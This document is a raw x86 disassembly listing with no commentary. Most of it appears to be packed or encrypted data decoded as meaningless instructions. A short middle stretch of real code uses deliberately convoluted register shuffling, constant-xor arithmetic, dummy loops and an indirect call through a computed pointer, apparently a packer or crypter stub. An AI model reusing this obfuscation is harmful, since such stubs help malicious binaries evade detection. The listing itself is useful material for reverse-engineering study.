  40cd33:	cmp    BYTE PTR [edx+edx*2+0x2e642cce],dh
  40cd3a:	aam    0xf1
  40cd3c:	call   0xab8bbb1a
  40cd41:	cmp    DWORD PTR [ebp-0x3e],ecx
  40cd44:	mov    cl,ah
  40cd46:	mov    al,ds:0x71e7da31
  40cd4b:	jae    0x40cd38
  40cd4d:	ret    
  40cd4e:	add    ch,BYTE PTR [eax]
  40cd50:	inc    eax
  40cd51:	pop    edx
  40cd52:	aas    
  40cd53:	mov    al,0x44
  40cd55:	int3   
  40cd56:	mov    ebx,0xd989d320
  40cd5b:	mov    ah,0xb8
  40cd5d:	dec    ecx
  40cd5e:	inc    edi
  40cd5f:	inc    ebp
  40cd60:	jae    0x40cde0
  40cd62:	sbb    BYTE PTR [eax+0x4b95f746],al
  40cd68:	cld    
  40cd69:	push   esp
  40cd6a:	imul   esi,edx,0xb760c353
  40cd70:	dec    edi
  40cd71:	push   ss
  40cd72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd73:	dec    ebp
  40cd74:	mov    eax,ds:0x9db00dde
  40cd79:	and    eax,0xaa739f8e
  40cd7e:	mov    ebp,0x65a69eb7
  40cd83:	adc    ebp,esp
  40cd85:	inc    ebx
  40cd86:	xchg   BYTE PTR [edx-0x7f9e33c8],cl
  40cd8c:	and    eax,0x1381961f
  40cd91:	mov    eax,0x5e20b8a
  40cd96:	leave  
  40cd97:	sub    al,0xe9
  40cd99:	jmp    0xd84c06c1
  40cd9e:	and    DWORD PTR [esi-0x29],ebx
  40cda1:	bound  ebp,QWORD PTR [esi]
  40cda3:	or     cl,BYTE PTR gs:[eax-0x10fa6ae5]
  40cdaa:	rol    BYTE PTR [eax+0xe],1
  40cdad:	xor    al,0x1
  40cdaf:	mov    edi,ecx
  40cdb1:	mov    ch,0x6f
  40cdb3:	cmc    
  40cdb4:	sub    bl,al
  40cdb6:	jbe    0x40cdd3
  40cdb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdb9:	sbb    BYTE PTR ds:0x248621ec,ah
  40cdbf:	mov    ebp,0xbac4078a
  40cdc4:	rcl    DWORD PTR [eax+0x1b68f9a6],cl
  40cdca:	add    DWORD PTR [eax],0xb0cb29a
  40cdd0:	push   ds
  40cdd1:	push   eax
  40cdd2:	mov    esp,0xa880e4ca
  40cdd7:	cmp    esi,DWORD PTR [eax]
  40cdd9:	jecxz  0x40ce24
  40cddb:	inc    eax
  40cddc:	out    0xdd,al
  40cdde:	sti    
  40cddf:	and    al,0x14
  40cde1:	dec    edi
  40cde2:	arpl   WORD PTR [ebx+esi*1],si
  40cde5:	dec    eax
  40cde6:	test   eax,0xad4d4207
  40cdeb:	ja     0x40cdff
  40cded:	add    eax,DWORD PTR [edi+0x4333918a]
  40cdf3:	and    dl,BYTE PTR [esi]
  40cdf5:	stos   DWORD PTR es:[edi],eax
  40cdf6:	test   BYTE PTR [ebx-0x28],al
  40cdf9:	inc    ecx
  40cdfa:	fidiv  WORD PTR [edi+0x737cb690]
  40ce00:	(bad)  
  40ce01:	dec    esp
  40ce02:	and    dh,BYTE PTR [esi+0x6b]
  40ce05:	imul   ebx,DWORD PTR [eax],0xb50ea910
  40ce0b:	out    0xb4,al
  40ce0d:	retf   0x2595
  40ce10:	mov    bl,0x88
  40ce12:	push   0x6f
  40ce14:	and    al,0x52
  40ce16:	hlt    
  40ce17:	sub    dh,al
  40ce19:	ja     0x40ce5f
  40ce1b:	fst    st(3)
  40ce1d:	mov    ch,0x16
  40ce1f:	mov    dl,0x38
  40ce21:	mov    dh,bh
  40ce23:	cmp    ebx,ebp
  40ce25:	xchg   esp,eax
  40ce26:	repnz adc bl,BYTE PTR [eax+0x1fc20741]
  40ce2d:	mov    bl,0xe
  40ce2f:	mov    ds,WORD PTR [ecx+0x3f7037aa]
  40ce35:	jo     0x40cdec
  40ce37:	push   ss
  40ce38:	(bad)  
  40ce39:	mov    ebx,0x3311078d
  40ce3e:	dec    cl
  40ce40:	mov    ds:0x573ba807,eax
  40ce45:	add    dl,ch
  40ce47:	cmp    ecx,eax
  40ce49:	je     0x40cec0
  40ce4f:	mov    edi,DWORD PTR [ebp-0x14]
  40ce52:	mov    eax,DWORD PTR [ebp+0x8]
  40ce55:	mov    edx,DWORD PTR [ebp+0x14]
  40ce58:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40ce5c:	mov    ecx,0x7510893
  40ce61:	xor    edx,edx
  40ce63:	xor    edi,ecx
  40ce65:	mov    esi,0x3272db
  40ce6a:	add    edi,esi
  40ce6c:	div    edi
  40ce6e:	mov    edx,DWORD PTR [ebp-0x4]
  40ce71:	xor    edx,ecx
  40ce73:	lea    eax,[edx+eax*1+0x3272db]
  40ce7a:	mov    edx,DWORD PTR [ebp+0x8]
  40ce7d:	mov    edi,DWORD PTR [ebp-0x20]
  40ce80:	mov    DWORD PTR [edi+edx*4],eax
  40ce83:	mov    eax,DWORD PTR [ebp-0x14]
  40ce86:	mov    edx,DWORD PTR [ebp+0x8]
  40ce89:	xor    eax,ecx
  40ce8b:	lea    eax,[eax+edx*1+0x3272db]
  40ce92:	mov    DWORD PTR [ebp+0x8],eax
  40ce95:	mov    eax,DWORD PTR [ebp-0x14]
  40ce98:	mov    edx,DWORD PTR [ebp+0x14]
  40ce9b:	xor    eax,ecx
  40ce9d:	add    eax,esi
  40ce9f:	imul   eax,DWORD PTR [edx]
  40cea2:	mov    edx,DWORD PTR [ebp-0x4]
  40cea5:	xor    edx,ecx
  40cea7:	mov    ecx,DWORD PTR [ebp+0x8]
  40ceaa:	lea    ecx,[edx+ecx*1+0x3272db]
  40ceb1:	cmp    ecx,eax
  40ceb3:	jne    0x40ce4f
  40ceb9:	mov    eax,esi
  40cebb:	jmp    0x40cec5
  40cec0:	mov    eax,0x3272db
  40cec5:	mov    ebx,0x7510893
  40ceca:	mov    ecx,DWORD PTR [ebp-0x4]
  40cecd:	xor    ecx,ebx
  40cecf:	add    ecx,eax
  40ced1:	mov    DWORD PTR [ebp-0xc],ecx
  40ced4:	mov    ebx,0x3874
  40ced9:	add    ebx,0x2342
  40cedf:	xchg   ebx,esi
  40cee1:	xor    ebx,ebx
  40cee3:	push   esi
  40cee4:	mov    esi,ebx
  40cee6:	pop    ebx
  40cee7:	mov    edx,esi
  40cee9:	add    ebx,0x1002
  40ceef:	lea    eax,[ebp-0x10]
  40cef2:	add    edx,eax
  40cef4:	add    edx,0x5
  40cef7:	push   edx
  40cef8:	inc    esi
  40cef9:	pop    ecx
  40cefa:	dec    ecx
  40cefb:	xchg   ecx,eax
  40cefc:	dec    eax
  40cefd:	xchg   ecx,eax
  40cefe:	dec    ecx
  40ceff:	xchg   ecx,edx
  40cf01:	dec    edx
  40cf02:	push   edx
  40cf03:	mov    edx,ebx
  40cf05:	pop    ebx
  40cf06:	dec    ebx
  40cf07:	call   DWORD PTR [ebx]
  40cf09:	cmp    DWORD PTR [ebp+0x10],esi
  40cf0c:	je     0x40cf2b
  40cf12:	xchg   edx,eax
  40cf13:	push   0xb
  40cf15:	pop    ecx
  40cf16:	push   0x4
  40cf18:	pop    ebx
  40cf19:	inc    ebx
  40cf1a:	xchg   ebx,ecx
  40cf1c:	sub    ebx,ecx
  40cf1e:	xchg   ebx,ecx
  40cf20:	dec    ecx
  40cf21:	dec    ecx
  40cf22:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf25:	imul   eax,ecx
  40cf28:	add    esp,eax
  40cf2a:	xchg   edx,eax
  40cf2b:	push   eax
  40cf2c:	xor    ebx,ebx
  40cf2e:	mov    edx,esp
  40cf30:	dec    edx
  40cf31:	inc    ebx
  40cf32:	add    ebx,DWORD PTR [edx+ebx*1]
  40cf35:	dec    ebx
  40cf36:	xor    edx,edx
  40cf38:	add    DWORD PTR [ebp-0xc],ebx
  40cf3b:	pop    ebx
  40cf3c:	mov    eax,DWORD PTR [ebp-0xc]
  40cf3f:	pop    edi
  40cf40:	pop    esi
  40cf41:	pop    ebx
  40cf42:	leave  
  40cf43:	ret    0x10
  40cf46:	or     DWORD PTR ds:0x42c00c,0x42a008
  40cf50:	xor    eax,eax
  40cf52:	add    DWORD PTR ds:0x428028,0x42a010
  40cf5c:	inc    eax
  40cf5d:	ret    
  40cf5e:	push   ebp
  40cf5f:	mov    ebp,esp
  40cf61:	mov    eax,ds:0x421c16
  40cf66:	and    DWORD PTR ds:0x42c008,0x0
  40cf70:	xor    ecx,ecx
  40cf72:	or     ecx,DWORD PTR ds:0x42c008
  40cf78:	inc    ecx
  40cf79:	mov    DWORD PTR ds:0x42c008,ecx
  40cf7f:	cmp    DWORD PTR ds:0x42c008,0xc
  40cf86:	jne    0x40cf9c
  40cf8c:	push   0x42389a
  40cf91:	push   0x423852
  40cf96:	call   DWORD PTR ds:0x424030
  40cf9c:	cmp    DWORD PTR ds:0x42c008,0xb
  40cfa3:	jne    0x40cfb6
  40cfa9:	mov    ecx,DWORD PTR ds:0x42c008
  40cfaf:	inc    ecx
  40cfb0:	mov    DWORD PTR ds:0x42c008,ecx
  40cfb6:	cmp    DWORD PTR ds:0x42c008,0x1b
  40cfbd:	jb     0x40cf70
  40cfc3:	xor    ecx,DWORD PTR ds:0x42a01c
  40cfc9:	mov    eax,DWORD PTR [eax+0x1c8]
  40cfcf:	add    ecx,0x4e81
  40cfd5:	mov    eax,DWORD PTR [eax]
  40cfd7:	and    ecx,DWORD PTR ds:0x42b018
  40cfdd:	cdq    
  40cfde:	push   ebx
  40cfdf:	mov    ecx,0xfabdbef1
  40cfe4:	add    ebx,0x1541
  40cfea:	add    eax,ecx
  40cfec:	adc    edx,0xffffffff
  40cfef:	push   esi
  40cff0:	push   edi
  40cff1:	mov    edi,DWORD PTR ds:0x421a36
  40cff7:	mov    ebx,DWORD PTR ds:0x421a5e
  40cffd:	sub    edi,ebx
  40cfff:	or     edi,DWORD PTR [edi+ebx*1]
  40d002:	mov    edi,edx
  40d004:	and    DWORD PTR ds:0x429000,0x0
  40d00e:	jmp    0x40d020
  40d013:	mov    edx,DWORD PTR ds:0x429000
  40d019:	inc    edx
  40d01a:	mov    DWORD PTR ds:0x429000,edx
  40d020:	cmp    DWORD PTR ds:0x429000,0x1a
  40d027:	jae    0x40d079
  40d02d:	cmp    DWORD PTR ds:0x429000,0x7
  40d034:	jne    0x40d05a
  40d03a:	push   DWORD PTR [ebp-0x1c]
  40d03d:	push   0x85ec
  40d042:	push   0x4f88
  40d047:	push   DWORD PTR [ebp-0x10]
  40d04a:	push   0x6e2c
  40d04f:	push   0x428000
  40d054:	call   DWORD PTR ds:0x424038
  40d05a:	cmp    DWORD PTR ds:0x429000,0x6
  40d061:	jne    0x40d074
  40d067:	mov    edx,DWORD PTR ds:0x429000
  40d06d:	inc    edx
  40d06e:	mov    DWORD PTR ds:0x429000,edx
  40d074:	jmp    0x40d013
  40d079:	mov    edx,DWORD PTR [ebp+0x8]
  40d07c:	adc    DWORD PTR ds:0x42a00c,0x42801c
  40d086:	mov    ebx,eax
  40d088:	mov    eax,0x8a29a123
  40d08d:	xor    esi,esi
  40d08f:	xor    ebx,eax
  40d091:	xor    edi,0x0
  40d094:	and    DWORD PTR ds:0x429000,0x1a3f
  40d09e:	add    edx,ecx
  40d0a0:	adc    esi,0xffffffff
  40d0a3:	xor    edx,eax
  40d0a5:	xor    esi,0x0
  40d0a8:	cmp    edx,ebx
  40d0aa:	jne    0x40d0b8
  40d0b0:	cmp    esi,edi
  40d0b2:	je     0x40d0e7
  40d0b8:	mov    edx,DWORD PTR ds:0x421c16
  40d0be:	mov    edx,DWORD PTR [edx+0x1c0]
  40d0c4:	mov    edx,DWORD PTR [edx]
  40d0c6:	xor    esi,esi
  40d0c8:	add    edx,ecx
  40d0ca:	adc    esi,0xffffffff
  40d0cd:	xor    edx,eax
  40d0cf:	xor    esi,0x0
  40d0d2:	cmp    edx,0x70941fd1
  40d0d8:	jne    0x413c0d
  40d0de:	cmp    esi,0xffffffff
  40d0e1:	jne    0x413c0d
  40d0e7:	mov    edx,DWORD PTR ds:0x421c9a
  40d0ed:	mov    esi,DWORD PTR ds:0x421c92
  40d0f3:	xor    edx,esi
  40d0f5:	mov    DWORD PTR ds:0x421c92,edx
  40d0fb:	mov    edx,DWORD PTR [ebp+0xc]
  40d0fe:	mov    edx,DWORD PTR [edx]
  40d100:	jmp    0x40f494
  40d105:	pop    ebp
  40d106:	xchg   edx,eax
  40d107:	add    DWORD PTR [ebx+0x6d],ebp
  40d10a:	imul   ebp,DWORD PTR [ebx-0x27d14c70],0xffffffcd
  40d111:	adc    eax,DWORD PTR ds:0xd1c2fcdb
  40d117:	bound  esp,QWORD PTR [edx-0x15]
  40d11a:	pop    edi
  40d11b:	bound  esp,QWORD PTR [edx-0x35]
  40d11e:	(bad)  
  40d11f:	enter  0x60ef,0x45
  40d123:	and    BYTE PTR ds:0x92ac5d51,bh
  40d129:	pop    edi
  40d12a:	pop    ds
  40d12b:	push   ebp
  40d12c:	xor    DWORD PTR [ecx],0x1c2b4667
  40d132:	cmp    ebx,ebx
  40d134:	sub    DWORD PTR [ebp-0x28dff276],0x8d7e9412
  40d13e:	or     eax,0xe549c22f
  40d143:	xchg   BYTE PTR [ebx],dh
  40d145:	mov    ds:0xefddcc61,eax
  40d14a:	xchg   esi,eax
  40d14b:	xor    esp,DWORD PTR [edi+0x59]
  40d14e:	cld    
  40d14f:	adc    eax,0xc4a3ff6f
  40d154:	fwait
  40d155:	out    0x4c,eax
  40d157:	xchg   ebx,eax
  40d158:	jne    0x40d0e5
  40d15a:	jl     0x40d1ab
  40d15c:	push   esp
  40d15d:	xor    DWORD PTR [edi],edx
  40d15f:	enter  0xac56,0x1a
  40d163:	mov    ebx,DWORD PTR [ebx-0x75]
  40d166:	jbe    0x40d1d0
  40d168:	xlat   BYTE PTR ds:[ebx]
  40d169:	push   edi
  40d16a:	push   0x4b
  40d16c:	mov    ds:0x1aba8889,eax
  40d172:	mov    edi,0xae33a714
  40d177:	and    al,BYTE PTR [eax+edi*4]
  40d17a:	push   ss
  40d17b:	cmp    eax,0xbc548697
  40d180:	imul   ebp,DWORD PTR [ebx],0xffffffdf
  40d183:	xor    DWORD PTR [eax+ebx*8+0x4be927be],esi
  40d18a:	push   cs
  40d18b:	xor    cl,BYTE PTR [edi+0x68]
  40d18e:	cmp    ch,BYTE PTR [ebx]
  40d190:	aaa    
  40d191:	fcomp  QWORD PTR [eax+0x23]
  40d194:	nop
  40d195:	mov    dl,0x70
  40d197:	adc    al,0x10
  40d199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d19a:	aaa    
  40d19b:	repnz shl ecx,0x4
  40d19f:	mov    bl,0x19
  40d1a1:	and    al,0x26
  40d1a3:	je     0x40d1fb
  40d1a5:	hlt    
  40d1a6:	cmp    DWORD PTR [edi+0x270791df],eax
  40d1ac:	xchg   ecx,eax
  40d1ad:	rcr    ecx,cl
  40d1af:	es jno 0x40d16d
  40d1b2:	jecxz  0x40d188
  40d1b4:	mov    ds:0xc63294d3,al
  40d1b9:	loop   0x40d182
  40d1bb:	imul   ebx,DWORD PTR [ebp+0x45f0507a],0x6ef61072
  40d1c5:	addr16 dec esi
  40d1c7:	sti    
  40d1c8:	jne    0x40d167
  40d1ca:	xor    DWORD PTR [edi+esi*2],ebx
  40d1cd:	mov    esi,0xb9fbe6c2
  40d1d2:	sar    DWORD PTR [ebp-0x19],0x6c
  40d1d6:	mov    BYTE PTR [eax+edi*4],0x5a
  40d1da:	arpl   WORD PTR [bx+si+0x34],bp
  40d1de:	mov    dl,0x91
  40d1e0:	call   esi
  40d1e2:	or     BYTE PTR [ebx],al
  40d1e4:	xor    eax,0x2659ce4c
  40d1e9:	scas   eax,DWORD PTR es:[edi]
  40d1ea:	mov    bh,0x31
  40d1ec:	xor    DWORD PTR [eax+esi*1+0x7e13a3cb],ebx
  40d1f3:	repnz xchg ebx,eax
  40d1f5:	push   ds
  40d1f6:	and    esi,DWORD PTR [esi-0x11]
  40d1f9:	aas    
  40d1fa:	leave  
  40d1fb:	fs adc al,0x73
  40d1fe:	push   ebp
  40d1ff:	nop
  40d200:	sbb    eax,DWORD PTR [ecx+0x32d1f218]
  40d206:	sub    bl,ch
  40d208:	sbb    ch,BYTE PTR [ecx-0x2c27f19d]
  40d20e:	sahf   
  40d20f:	nop
  40d210:	mov    ecx,0x89ea1a92
  40d215:	dec    ecx
  40d216:	mov    edx,es
  40d218:	push   ebp
  40d219:	or     DWORD PTR [esp+ebx*8+0x72],0x6a
  40d21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d21f:	inc    ebp
  40d220:	or     BYTE PTR [ebx+eax*8],ch
  40d223:	jne    0x40d1c6
  40d225:	cs retf 
  40d227:	inc    esp
  40d228:	and    esp,edx
  40d22a:	aas    
  40d22b:	fwait
  40d22c:	push   ds
  40d22d:	pop    ebx
  40d22e:	jns    0x40d236
  40d230:	inc    eax
  40d231:	loopne 0x40d1b7
  40d233:	cmc    
  40d234:	mov    dl,0xc8
  40d236:	loopne 0x40d25d
  40d238:	add    eax,0x77980bcb
  40d23d:	(bad)  
  40d23e:	daa    
  40d23f:	retf   0xe166
  40d242:	sub    DWORD PTR [ebx+ebp*4+0x4bf3633d],esi
  40d249:	sar    BYTE PTR [esp+eiz*8+0x6e0ff7be],1
  40d250:	xchg   edi,eax
  40d251:	fldcw  WORD PTR [eax-0x104da657]
  40d257:	call   0x75d67f8a
  40d25c:	sar    DWORD PTR [edx+0x63de4781],cl
  40d262:	loope  0x40d255
  40d264:	pop    ecx
  40d265:	div    DWORD PTR [edx-0x52]
  40d268:	adc    BYTE PTR [edi+0x41],al
  40d26b:	fisub  WORD PTR gs:[ebx+0x527e287]
  40d272:	in     al,0x63
  40d274:	dec    ebx
  40d275:	or     al,0xf7
  40d277:	jno    0x40d2d0
  40d279:	arpl   di,cx
  40d27b:	mov    DWORD PTR [esi+ecx*4],esi
  40d27e:	xchg   DWORD PTR [eax+edx*1+0x3f28cde1],edi
  40d285:	shl    DWORD PTR [eax-0x37dcc0bb],1
  40d28b:	fldenv [ebx]
  40d28d:	jne    0x40d238
  40d28f:	mov    es,WORD PTR [edi]
  40d291:	imul   edi,DWORD PTR [esi+0x56],0x9e35e60
  40d298:	pop    edx
  40d299:	ret    
  40d29a:	sub    DWORD PTR [ecx+0x67],edx
  40d29d:	pop    eax
  40d29e:	mov    dl,0x87
  40d2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2a1:	retf   
  40d2a2:	aam    0x1
  40d2a4:	mov    ebp,0x8a690b29
  40d2a9:	lea    edx,[ebx-0x689cd6cb]
  40d2af:	sbb    al,bh
  40d2b1:	in     al,dx
  40d2b2:	pushf  
  40d2b3:	or     DWORD PTR [edx],esi
  40d2b5:	cmp    DWORD PTR [esi+0x3e5dfcaa],edx
  40d2bb:	and    eax,edi
  40d2bd:	call   0x27cb44e0
  40d2c2:	(bad)  
  40d2c3:	in     eax,0xfa
  40d2c5:	xchg   ecx,eax
  40d2c6:	neg    ebp
  40d2c8:	(bad)
  40d2cb:	iret   
  40d2cc:	inc    ebp
  40d2cd:	xchg   esi,eax
  40d2ce:	stc    
  40d2cf:	xor    al,0x87
  40d2d1:	mov    ah,0x7c
  40d2d3:	mov    WORD PTR [ebp-0x5],?
  40d2d6:	je     0x40d344
  40d2d8:	jmp    0x40d294
  40d2da:	push   edi
  40d2db:	pop    ebp
  40d2dc:	iret   
  40d2dd:	add    DWORD PTR [edx+0x60b2082b],edx
  40d2e3:	pop    ss
  40d2e4:	aam    0xc2
  40d2e6:	stos   BYTE PTR es:[edi],al
  40d2e7:	mov    al,0xf8
  40d2e9:	(bad)  
  40d2ea:	jge    0x40d33d
  40d2ec:	sub    eax,0xc3db590c
  40d2f1:	push   edi
  40d2f2:	aas    
  40d2f3:	fsub   QWORD PTR [edx]
  40d2f5:	pop    eax
  40d2f6:	stc    
  40d2f7:	arpl   WORD PTR [ebx+0x6805f57],sp
  40d2fd:	ins    BYTE PTR es:[edi],dx
  40d2fe:	ss fsin 
  40d301:	loop   0x40d316
  40d303:	add    cl,BYTE PTR [ebp-0x9331ffd]
  40d309:	dec    edi
  40d30a:	stc    
  40d30b:	ins    BYTE PTR es:[edi],dx
  40d30c:	push   esi
  40d30d:	pusha  
  40d30e:	adc    eax,0x21263c62
  40d313:	xchg   esp,eax
  40d314:	jo     0x40d2f1
  40d316:	cld    
  40d317:	lahf   
  40d318:	sbb    ch,bl
  40d31a:	outs   dx,DWORD PTR ds:[esi]
  40d31b:	out    dx,eax
  40d31c:	cs pop ss
  40d31e:	sbb    al,0x11
  40d320:	mov    al,ds:0x889e8c02
  40d325:	ins    BYTE PTR es:[edi],dx
  40d326:	ror    DWORD PTR [edx+0x58f8f4f7],1
  40d32c:	sbb    eax,0xf3af3601
  40d331:	add    ebx,DWORD PTR [eax+edx*4-0x61]
  40d335:	sbb    esp,DWORD PTR ds:0x98637f7f
  40d33b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d33c:	cmc    
  40d33d:	sahf   
  40d33e:	or     ebx,eax
  40d340:	and    al,BYTE PTR [ecx+0xe]
  40d343:	jmp    0xda8:0x3b67
  40d349:	fucomip st,st(3)
  40d34b:	inc    edx
  40d34c:	fld    DWORD PTR [esi+eax*4+0x69]
  40d350:	loope  0x40d315
  40d352:	fisttp WORD PTR [esi+ebx*8-0x57129f96]
  40d359:	syscall 
  40d35b:	psllw  mm4,QWORD PTR [ebx+0x17a0d24f]
  40d362:	cld    
  40d363:	dec    eax
  40d364:	mov    ch,0x89
  40d366:	sbb    ah,BYTE PTR [ebx+0x7b9dd8a7]
  40d36c:	mov    eax,0x82bf20ae
  40d371:	xchg   ecx,eax
  40d372:	xchg   ebp,eax
  40d373:	add    esp,DWORD PTR [edi+0x3b]
  40d376:	(bad)  
  40d377:	xlat   BYTE PTR ds:[ebx]
  40d378:	sub    eax,0xfd63ce47
  40d37d:	cmp    BYTE PTR [esi],ah
  40d37f:	add    al,0x1a
  40d381:	fisttp WORD PTR [ebx]
  40d383:	dec    ecx
  40d384:	ins    DWORD PTR es:[edi],dx
  40d385:	pop    ebp
  40d386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d387:	(bad)  
  40d388:	jg     0x40d402
  40d38a:	mov    ch,0x6e
  40d38c:	xor    ch,ah
  40d38e:	dec    esi
  40d38f:	and    eax,DWORD PTR [edx-0x74]
  40d392:	adc    eax,edx
  40d394:	jmp    0xa543:0x515ef60a
  40d39b:	repnz leave 
  40d39d:	and    al,0x63
  40d39f:	daa    
  40d3a0:	inc    edx
  40d3a1:	mov    cl,0x2a
  40d3a3:	and    DWORD PTR [esi],0x739b4e1c
  40d3a9:	sbb    al,0x7
  40d3ab:	aam    0x9c
  40d3ad:	icebp  
  40d3ae:	mov    edx,0xcd2c1de3
  40d3b3:	out    dx,eax
  40d3b4:	sbb    eax,0x95b196c8
  40d3b9:	sbb    ecx,ecx
  40d3bb:	out    0x91,al
  40d3bd:	js     0x40d39f
  40d3bf:	or     DWORD PTR [ecx],eax
  40d3c1:	test   BYTE PTR [esi-0x5c],bh
  40d3c4:	cld    
  40d3c5:	xchg   ebx,eax
  40d3c6:	inc    dh
  40d3c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d3c9:	shr    BYTE PTR [ecx-0x505ba8f],cl
  40d3cf:	lods   al,BYTE PTR ds:[esi]
  40d3d0:	(bad)  
  40d3d1:	sti    
  40d3d2:	pop    ebp
  40d3d3:	rcr    BYTE PTR [edx-0x2c],0xc0
  40d3d7:	ss xor bh,dh
  40d3da:	push   esi
  40d3db:	int    0xb4
  40d3dd:	xchg   ebp,eax
  40d3de:	daa    
  40d3df:	push   0x36a30331
  40d3e4:	adc    bh,bl
  40d3e6:	mov    ah,0x73
  40d3e8:	clc    
  40d3e9:	sbb    eax,0x6d3d48df
  40d3ee:	jg     0x40d40f
  40d3f0:	clc    
  40d3f1:	xchg   esp,eax
  40d3f2:	(bad)
  40d3f5:	pop    edx
  40d3f6:	test   eax,0x370fa934
  40d3fb:	or     dh,BYTE PTR [edx+0x4aca6390]
  40d401:	out    0xa3,eax
  40d403:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d404:	and    ebp,esp
  40d406:	dec    eax
  40d407:	xor    BYTE PTR [ecx],bl
  40d409:	aas    
  40d40a:	xor    DWORD PTR [eax],eax
  40d40c:	or     eax,0x9c267a67
  40d411:	sti    
  40d412:	(bad)  
  40d413:	jle    0x40d46b
  40d415:	sbb    edx,DWORD PTR [ebp-0x3a]
  40d418:	or     esp,ebx
  40d41a:	arpl   WORD PTR [eax+0x19739a5b],sp
  40d420:	dec    eax
  40d421:	jmp    0xdd23:0xa6d33ca4
  40d428:	mov    ds:0x6871f879,al
  40d42d:	and    al,0x55
  40d42f:	mov    al,ds:0xa0cf2b50
  40d434:	retf   
  40d435:	xchg   esp,eax
  40d436:	dec    ecx
  40d437:	shl    BYTE PTR [edi],0xa6
  40d43a:	jge    0x40d400
  40d43c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d43e:	popf   
  40d43f:	popf   
  40d440:	ins    BYTE PTR es:[edi],dx
  40d441:	inc    edx
  40d442:	adc    al,0xe
  40d444:	pop    eax
  40d445:	test   esi,edx
  40d447:	ror    DWORD PTR [eax+0x1f],0x50
  40d44b:	leave  
  40d44c:	enter  0xe22b,0x13
  40d450:	cmc    
  40d451:	(bad)  
  40d452:	mov    edi,0xeb969f77
  40d457:	pop    esi
  40d458:	xor    BYTE PTR ds:0xbedd6c93,cl
  40d45e:	fsubr  QWORD PTR [esi+0x51b824c4]
  40d464:	or     DWORD PTR [ebx+0xe],esi
  40d467:	lds    esp,FWORD PTR [ebx+0x5b]
  40d46a:	sbb    al,0xe2
  40d46c:	sbb    DWORD PTR [esi-0x80],ebp
  40d46f:	mov    eax,0x630c8011
  40d474:	or     cl,cl
  40d476:	retf   0xea96
  40d479:	xor    esp,DWORD PTR [edx+0x40ddec95]
  40d47f:	mov    eax,ds:0x9fd9e4e0
  40d484:	dec    esi
  40d485:	call   0x4821:0x733f2109
  40d48c:	test   al,0xe0
  40d48e:	mov    esi,0xd05af5ad
  40d493:	fistp  WORD PTR [esi]
  40d495:	fwait
  40d496:	adc    al,0xa
  40d498:	xor    ebx,0xffffffe1
  40d49b:	pop    ds
  40d49c:	add    eax,0xf55e79a7
  40d4a1:	push   ds
  40d4a2:	mov    al,BYTE PTR [edx+0x7b]
  40d4a5:	pop    ss
  40d4a6:	add    DWORD PTR [ecx],edx
  40d4a8:	fmul   DWORD PTR [eax+0x1e]
  40d4ab:	ret    
  40d4ac:	inc    ecx
  40d4ad:	dec    esi
  40d4ae:	fst    QWORD PTR [edx]
  40d4b0:	dec    edx
  40d4b1:	add    DWORD PTR [eax-0x21f1bb72],0xffffffae
  40d4b8:	cmp    cl,bh
  40d4ba:	pushf  
  40d4bb:	adc    al,0x46
  40d4bd:	int3   
  40d4be:	es (bad) 
  40d4c0:	pop    edx
  40d4c1:	pop    edi
  40d4c2:	into   
  40d4c3:	dec    edi
  40d4c4:	sahf   
  40d4c5:	lock adc esp,edx
  40d4c8:	test   al,0x61
  40d4ca:	adc    eax,ebp
  40d4cc:	xor    eax,0x1baba73d
  40d4d1:	ficom  DWORD PTR [eax+ebp*8]
  40d4d4:	test   BYTE PTR [eax+ebx*2-0x619f12ab],ch
  40d4db:	mov    BYTE PTR [edx],ah
  40d4dd:	push   esi
  40d4de:	call   0x28f0:0x600a6d7f
  40d4e5:	lahf   
  40d4e6:	dec    DWORD PTR [esp+edi*8-0x5b663b44]
  40d4ed:	fwait
  40d4ee:	mov    bh,0x9a
  40d4f0:	popa   
  40d4f1:	pop    ebp
  40d4f2:	sbb    al,0x4c
  40d4f4:	jl     0x40d4a2
  40d4f6:	mov    bl,0xdb
  40d4f8:	test   eax,0x1f27219
  40d4fd:	and    BYTE PTR [eax-0x726213ea],0x91
  40d504:	out    dx,eax
  40d505:	xchg   ecx,eax
  40d506:	je     0x40d514
  40d508:	aad    0x9e
  40d50a:	dec    esi
  40d50b:	mov    bh,0xbb
  40d50d:	push   esi
  40d50e:	inc    esi
  40d50f:	outs   dx,BYTE PTR ds:[esi]
  40d510:	pop    es
  40d511:	cmc    
  40d512:	jae    0x40d51f
  40d514:	jae    0x40d4c3
  40d516:	mov    ah,0x96
  40d518:	call   0xde7676c8
  40d51d:	mov    ds:0x6a39adda,eax
  40d522:	or     edx,DWORD PTR [edx+0x155f14c3]
  40d528:	xchg   bl,al
  40d52a:	rcl    ah,cl
  40d52c:	or     eax,0xe21bd5a3
  40d531:	mov    cl,0xfb
  40d533:	outs   dx,DWORD PTR ds:[esi]
  40d534:	mov    cl,0x2
  40d536:	or     bl,dl
  40d538:	in     eax,0x36
  40d53a:	or     al,0xf2
  40d53c:	mov    esp,0xef43b632
  40d541:	or     DWORD PTR [edx],eax
  40d543:	ja     0x40d58c
  40d545:	mov    ds:0x6881bfbc,eax
  40d54a:	aad    0xa8
  40d54c:	pop    edi
  40d54d:	fadd   st(6),st
  40d54f:	gs sahf 
  40d551:	jbe    0x40d4e1
  40d553:	or     DWORD PTR [eax-0x6932c4ef],0x6249668b
  40d55d:	fs mov ecx,0x4701911e
  40d563:	cmp    ecx,DWORD PTR [ebx+0x1e90aadf]
  40d569:	jp     0x40d4f7
  40d56b:	fistp  DWORD PTR [ebp+0x72]
  40d56e:	mov    dl,0x37
  40d570:	sbb    DWORD PTR [esi+edi*1+0x16],ebp
  40d574:	dec    esi
